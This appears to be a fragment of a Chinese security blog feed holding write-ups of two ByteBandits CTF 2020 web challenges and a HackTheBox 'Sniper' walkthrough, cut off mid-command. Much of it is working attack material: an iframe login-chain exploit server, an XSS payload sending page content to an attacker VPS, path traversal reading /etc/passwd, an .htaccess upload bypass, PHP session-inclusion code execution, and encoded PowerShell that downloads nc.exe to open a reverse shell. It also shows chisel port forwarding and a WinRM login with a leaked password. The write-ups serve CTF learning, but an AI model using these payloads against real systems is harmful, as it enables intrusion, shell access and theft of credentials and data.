class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler,HTTPServer</span><br><span class="line"></span><br><span class="line">PORT_NUMBER = <span class="number">8877</span></span><br><span class="line"></span><br><span class="line">SERVER = <span class="string">"https://notes.web.byteband.it"</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">"abc"</span></span><br><span class="line">PASSWORD = <span class="string">"123"</span></span><br><span class="line"></span><br><span class="line">EXPLOIT = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;script type='text/javascript'&gt;</span></span><br><span class="line"><span class="string">function loginUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/login?username=&#123;username&#125;&amp;password=&#123;password&#125;";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function logoutUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.onload = loginUser;</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/logout";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;iframe id="iframe01" name="iframe01" src="&#123;server&#125;/profile" sandbox="allow-same-origin allow-scripts" onload="logoutUser(this)"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>.format(server=SERVER, username=USERNAME, password=PASSWORD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">"Content-type"</span>, <span class="string">"text/html"</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(EXPLOIT.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        time.sleep(<span class="number">10</span>)  <span class="comment"># keep open for some time for exploit to finish</span></span><br><span class="line"></span><br><span class="line">myServer = HTTPServer((<span class="string">"0.0.0.0"</span>, PORT_NUMBER), MyServer)</span><br><span class="line">print(time.asctime(), <span class="string">"Server Starts - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    myServer.serve_forever()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">myServer.server_close()</span><br><span class="line">print(time.asctime(), <span class="string">"Server Stops - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br></pre></td></tr></table></figure><p>从这行代码就能看出主要流程跟之前构思的思路是一致的。<br><code>&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;</code><br>主要就是要sleep10s.<br>在vps上运行。然后我们用自己的abc用户updatepayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;(new Image).src &#x3D; &#39;http:&#x2F;&#x2F;vpsip:port&#x2F;?data&#x3D;&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure><p>起到窃取iframe内容的作用,获取的内容源自hero-body这个class的内容。<br>最后url提交<code>vpsip:port</code>即可<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag1.PNG" alt><br>解码即可发现flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Howdy admin!</span><br><span class="line">flag&#123;ch41n_tHy_3Xploits_t0_w1n&#125;</span><br></pre></td></tr></table></figure><h2 id="ImgAccess2"><a href="#ImgAccess2" class="headerlink" title="ImgAccess2"></a>ImgAccess2</h2><p>这题很有营养。首先上来一个文件上传。根据题意只能是图片,同时上传后进入到upload路由,并能通过<code>/view/md5.../filename</code>访问到自己的图片</p><p>那么当然要考虑文件上传getshell了。但是首先注意到,从题目的路由与cookie明显提醒我们这是python起的web服务。但是同时访问404时出现的是类似apache的404页面</p><p>并且路径上出现的是/view/xxxx而不是upload/xxxxx,也就意味着，我们需要找出真正的上传路径</p><p>尝试upload/xxx/1.jpg发现返回404<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/1.PNG" alt></p><p>但是将upload改为uploads时发现可以访问到我们的上传图片了。</p><p>因此确定，真实的上传路径是uploads且可以访问到。<br>此时考虑是否能利用这个路径做些文章</p><p>相对容易想到的应该是路径穿越了，但尝试构造普通路径穿越失败。<br>不过路径穿越还有一种相对比较熟悉的绕过姿势。比如urlencode两次的路径穿越,(phpmyadmin4.8.1就曾出现过)<br>那么此处尝试对路径穿越进行二次url编码<br><code>../../../../../etc/passwd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://xxxxxxx:7003/uploads/'</span></span><br><span class="line"></span><br><span class="line">filepath=<span class="string">'../../../../../../etc/passwd'</span></span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">r=requests.get(url+filepath)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>发现成功读取了/etc/passwd<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/2.PNG" alt><br>接下来肯定是想要得到其他有用信息了，比如app.py的源码<br>想先读<code>/proc/self/environ</code>,发现没内容。但是不要紧，此时必然可行的方法是利用<code>/proc/self/cwd</code>指向当前工作目录的特性，直接读取app.py<br><code>/proc/self/cwd/app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line"><span class="comment"># app.config['UPLOAD_FOLDER'] = "/uploads"</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'s'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">    os.mkdir(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r"(\.\.|/)"</span>, <span class="string">""</span>, filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    caption = request.form[<span class="string">"caption"</span>]</span><br><span class="line">    file = request.files[<span class="string">"image"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">        flash(<span class="string">'Please upload images only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.headers.get(<span class="string">"X-Real-IP"</span>):</span><br><span class="line">           ip = request.remote_addr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           ip = request.headers.get(<span class="string">"X-Real-IP"</span>)</span><br><span class="line">        dirname = md5(ip.encode()).hexdigest()</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>, path = os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/view/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>, path = path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="comment"># TODO(noob):</span></span><br><span class="line">    <span class="comment"># zevtnax told me use apache for static files. I've</span></span><br><span class="line">    <span class="comment"># already configured it to serve /uploads_apache but it</span></span><br><span class="line">    <span class="comment"># still needs testing. I'm a security noob anyways.</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>发现几个信息。首先是uploads路由里存在明显的提示。暗示我们/uploads_apache/路径</p><p>然后是文件名的检查。很奇怪的是文件名的白名单里有个s.之后先调用<code>allowed_file()</code>进行文件后缀检查，然后调用<code>secure_filename()</code>进行文件名检查<br>第一个函数只检查最后一个<code>.</code>后的后缀。而第二个函数将<code>..</code>替换为空<br>那么这必然存在绕过.联系到这是一个apache服务器,且只允许图片上传。考虑上传<code>.htaccess</code>进行getshell<br>同时为了绕过文件名，使用<code>.htacces..s</code><br>第一个函数检查时判定后缀为s,在白名单内。<br>第二个函数将..替换为空，成功达到上传<code>.htaccess</code>的效果</p><p>内容<br><code>addtype application/x-httpd-php .jpg</code><br>成功上传,直接上传图片马getshell。</p><p>getshell后发现没有flag.比赛时题目有提示flag在secretserver:1337。所以方便直接下手。靶机没有curl，那就直接wget即可。</p><p>不过就算不知道提示也可以做，容器里有python3，那就肯定可以探测端口<br>从/etc/hosts得知ip为192.168.128.2.那就顺着探吧。<br>用上忘记从哪位大佬那嫖来的脚本，做buu时用过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'192.168.128.3'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure><p>也可以发现1337端口开放。<br>先<code>wget 192.168.128.3:1337</code>得到index.html<br>其中内容提示了./flag.txt<br>直接<code>wget 192.168.128.3:1337/flag.txt</code>即可<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag0.PNG" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/" target="_blank" rel="noopener">https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Sniper--初尝windows靶机</title>
      <link href="2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/"/>
      <url>2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。<br>有趣的是,这台靶机获得webroot的shell有不同的操作方法，同时具体后面提权时也将有不同的方法进行细节上不同的操作。具体细节将在后面的文章中提到。</p><a id="more"></a><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" alt></p><p>攻击机ip： kalilinux 10.10.15.189<br>靶机ip windows10 10.10.10.151 </p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先是老套的端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h02m38s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-04-01T08:23:29</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><p>可以看到是一台windows靶机，配有IIS服务。不过开启的几个端口中包含了445端口,这是SMB服务开放的端口。</p><blockquote><p>port 445: Microsoft Windows SMB Server远程代码执行漏洞</p></blockquote><p>著名的永恒之蓝漏洞也是通过这一端口利用的。当然这里并没有什么渗透点，只是说明我们可以通过smbserver连接到靶机,尝试基本的smb连接的话发现必然是要密码的。</p><p>那么还是从80端口入手。访问网页，发现是php网页。IIS+php实际上是非常奇怪的配置,但我们显然可以以此为入手点。</p><h2 id="LFI-RFI-gt-命令执行-gt-webshell"><a href="#LFI-RFI-gt-命令执行-gt-webshell" class="headerlink" title="LFI/RFI=&gt;命令执行=&gt;webshell"></a>LFI/RFI=&gt;命令执行=&gt;webshell</h2><p>首先在blog下发现一个语言切换功能，其参数可以文件包含。<code>/blog?lang=blog-en.php</code><br>尝试伪协议等常规套路读源码均以失败告终。<br>简单读windows的文件<code>?lang=/windows/system32/license.rtf</code><br>发现有回显。那么现在目的是得到一个web-root的shell，如何操作呢？<br>此时有一种相对”简单”的办法,利用上面提到的是smb服务。我们再本机kali新建一个smb服务，然后直接rfi进行操作。<br>RFI的基本操作套路如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?lang&#x3D;\\10.10.14.62\share\foo.php</span><br></pre></td></tr></table></figure><p>但是需要注意。想通过SMB达成rfi我们必须修改本机的是smb服务的权限,控制文件夹的权限为777等等，操作起来对我这样的小白而言相对困难了。那么有没有其他方法得到webshell呢?</p><p>有,而这也是我学到的不同于常规套路的方法。<br>回到之前php网页的思路上。有这样的一个细节可以注意：这是一个windows靶机的php服务，其session值被存储在固定的文件夹了。<br>我们尝试一下随意注册一个用户名，并且记录下session值。通过下面的payload包含session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lang&#x3D;&#x2F;Windows&#x2F;Temp&#x2F;sess_1d6bfk00vc159thng1t5q521qg</span><br></pre></td></tr></table></figure><p>此时查看包含的结果，发现是含有用户名的序列化数据。那么类似于之前tp5的session固定存储类的漏洞，我们可以从这里下手，将php代码写入session数据。</p><p>首先尝试简单的fuzz,发现用户名过滤了一些关键字。这里直接给出可行的payload及回显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`whoami`<span class="meta">?&gt;</span></span><br><span class="line">lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg</span><br><span class="line">username|s:<span class="number">13</span>:<span class="string">"nt authority\iusr</span></span><br></pre></td></tr></table></figure><p>利用短标签加反引号直接执行命令。可以看到成功执行whoami。<br>接下来可以写webshell,也可以直接命令执行。这里直接进行命令执行。</p><p>尝试常规的powershell反弹shell失败。之后会发现可能是因为powershell运行在constraintmode的原因。但是不要紧，利用lfi+命令执行我们还有其他方法拿到windows靶机的shell。<br>首先找到本机的netcat(即平时使用的nc),把它传到windows机上。(当然需要先建好www文件夹,并把本机的nc.exe复制到里面)<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure><p>将准备好的payload进行编码避免过滤。<br>注册新用户名为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`powershell /enc &#123;your encoded  command &#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用/enc是powershell对应的解码flag,没使用-enc是为了解决过滤问题。<br>然后包含对应的用户的session即可执行。<br>再利用lfi检查是否已经把nc传上去了<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" alt></p><p>很好。那么再进行反弹shell的命令吧。<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure><p>本机监听8899.浏览器包含,并得到webshell</p><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" alt></p><h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>拿到webshell后我们首先检查下源码。很快就有所发现<br>\user\db.php中可以发现一个数据库的密码<code>36mEAhz/B8xQ~2VM</code>.而且在User中可以发现用户Chris的存在。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" alt><br>下面尝试拿到usershell.<br>这里将再次用到我们之前使用过的端口转发。不过需要一个工具来帮助我们实现。<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>从githubrelease处下载chisel的linux与windows版本。分别用于本机与靶机。然后wget把windows版本的传输到靶机上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali: chmod +x chisel_linux_amd64</span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line">shell: wget http://10.10.15.189/chisel.exe -O chisel.exe</span><br><span class="line"></span><br><span class="line">portforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" alt></p><p>开启<code>--reverse</code>允许我们转发端口。而最后一步我们把5985与3306端口转发到本地。5985对应的是WinRM服务，可用于远程管理。我们把它转发到本地后，可以利用另一个渗透工具evil-winrm进行用户登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm</span><br><span class="line">sudo gem install winrm winrm-fs stringio</span><br></pre></td></tr></table></figure><p>只需两步即可使用。<br>然后evil-winrm继续登录，直接本地127.0.0.1即可。因为我们端口已经转发好了。<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" alt><br>拿到usershell.</p><p>之所以用这么多工具进行user的提权其实是因为这里想要通过其他方法得到usershell要再次反弹shell.<br>并且操作起来有点麻烦.这里我简单提一下，就是直接通过powershell命令创建一个属于Chris的变量，然后再反弹shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">'36mEAhz/B8xQ~2VM'</span> -asplaintext -force</span><br><span class="line"><span class="variable">$cred</span> = new-object system.management.automation.pscredential(<span class="string">"sniper\chris"</span>, <span class="variable">$pass</span>)</span><br><span class="line">invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential <span 